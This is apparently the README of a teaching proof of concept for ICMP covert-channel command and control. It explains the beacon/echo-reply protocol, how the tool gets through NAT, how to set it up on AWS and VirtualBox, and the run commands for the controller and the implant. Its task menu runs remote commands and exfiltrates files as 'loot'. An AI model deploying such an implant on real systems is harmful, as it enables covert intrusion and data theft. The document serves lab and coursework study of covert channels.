# icmp-c2

ICMP echo C2 for authorised labs and coursework.

The **agent beacons first** (`CMD!BEACON|<id>`, ICMP type **8**) on an interval
with optional jitter. The controller queues menu tasks and answers the next
beacon with an ICMP **echo reply** (type **0**, matching id/seq) so home NAT
can deliver the command. Job results still stream as zlib-chunked
`[START]` / `[CHUNK]` / `[END]` with `RETRY` / `ACK`.

Teaching PoC only — not a product.

## Protocol (short)

```text
agent      --BEACON|id-->  controller     (ICMP type 8 echo request)
controller --LS|./RUN|…--> agent         (ICMP type 0 echo reply to that beacon)
agent      --START/CHUNK/END--> controller (type 8 uplink)
controller --RETRY / ACK--> agent         (type 0 reply to END / stream)
```

Behind residential NAT, a fresh type-8 from the controller to the home public
IP does **not** reach the agent. Echo replies tied to the beacon do.

## Features

- Outbound agent beacon + jitter (not pull-only / server-push)
- Task queue on the controller; dispatch tied to beacon
- Dynamic target IP from beacon (optional `--lock-target`)
- Downlink as ICMP type **0** (echo reply); uplink / beacon as type **8**
- zlib chunked uplink with selective RETRY of missing seq numbers
- source-IP filter on both sides
- busy lock so overlapping jobs do not corrupt the stream
- quiet beacons (no per-beacon `*` spam; print only on IP change)
- kernel `icmp_echo_ignore_all` toggled on the controller, restored on exit
- no baked-in lab IPs; everything is flags or env

## Dependencies

```bash
pip3 install scapy
# or from the suite root:
pip3 install -r requirements.txt
```

Both sides need **root** (raw sockets / sniff).

## Usage

Controller (AWS / listener — `--target` optional when agents beacon):

```bash
sudo python3 controller.py --iface ens5
# or pin / pre-seed target:
sudo python3 controller.py --target <home-public-ip> --iface ens5
sudo python3 controller.py --target 192.168.56.3 --iface vboxnet1 --lock-target
```

Agent (home / implant side):

```bash
sudo python3 agent.py --server <ec2-public-ip> --iface wlp8s0
sudo python3 agent.py --server 192.168.56.1 --iface eth0 \
  --beacon-interval 5 --jitter 0.3 --agent-id lab-kali
```

Env equivalents: `ICMP_C2_SERVER`, `ICMP_C2_IFACE`, `ICMP_C2_TARGET`,
`ICMP_C2_BEACON`, `ICMP_C2_JITTER`, `ICMP_C2_AGENT_ID`.

Confirm NIC names with `ip -br addr`.

## VirtualBox lab

Sniff and send must use the **host-only** interface (commonly `vboxnet1` on
the Ubuntu host). If you omit `--iface`, Scapy follows the default route
(usually Wi-Fi) and you will see outbound traffic on the wrong NIC. Same-L2
labs can still use legacy type-8 push (`send_trigger`); AWS+NAT needs type 0.

## AWS lab

- Run the **controller** on EC2; run the **agent** on your lab host so it
  beacons **out** through NAT.
- Security group: allow **All ICMP** (not echo-request only) from **your**
  `/32`, plus SSH; tighten when the lab ends.
- Set controller `--iface` to the instance primary ENI (`ens5` / `eth0`).
- Disconnect consumer VPNs that block ICMP before testing.
- Host `tcpdump` should show inbound type-0 with `CMD!` after a queued job.

## Menu

```text
=== ICMP C2 lab menu ===
1: List Directory (ls) | 2: Run Command | 3: Fetch File | 4: Exit & Restore
```

Tasks are **queued** until the next agent beacon. Fetched files land as
`loot_*` next to the controller. Beacons are quiet unless the learned source
IP changes.

## Limitations

- ICMP seq is 16-bit; very large file fetches can wrap chunk indices
- Hard kill (`kill -9`) can leave `icmp_echo_ignore_all=1` until you reset it:
  `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0`
- Some campus / CGNAT paths still drop ICMP entirely — use host-only / same L2
  if echo replies never arrive

## Build notes

See [IMPLEMENTATION.md](./IMPLEMENTATION.md) for the function-by-function lab
build story (AI-assisted iteration, NAT lesson).

Authorised labs and coursework only — see the suite
[DISCLAIMER.md](../../DISCLAIMER.md).
